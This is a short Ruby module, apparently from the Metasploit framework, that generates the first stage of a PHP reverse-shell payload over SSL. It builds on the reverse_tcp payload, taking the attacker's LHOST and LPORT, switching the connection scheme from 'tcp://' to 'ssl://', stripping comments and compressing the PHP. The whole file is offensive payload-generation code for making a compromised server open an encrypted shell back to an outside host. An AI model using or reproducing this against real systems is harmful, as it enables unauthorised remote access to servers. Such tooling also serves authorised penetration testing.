
# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/php/reverse_tcp'

module Msf

###
#
# Complex reverse_tcp payload generation for PHP
#
###

module Payload::Php::ReverseTcpSsl

  include Payload::Php::ReverseTcp

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
    }

    php = super + generate_reverse_tcp_ssl(conf)
    php.gsub!(/#.*$/, '')
    Rex::Text.compress(php)
  end

  def generate_reverse_tcp_ssl(opts={})
    generate_reverse_tcp(opts).gsub('tcp://','ssl://')
  end

end

end

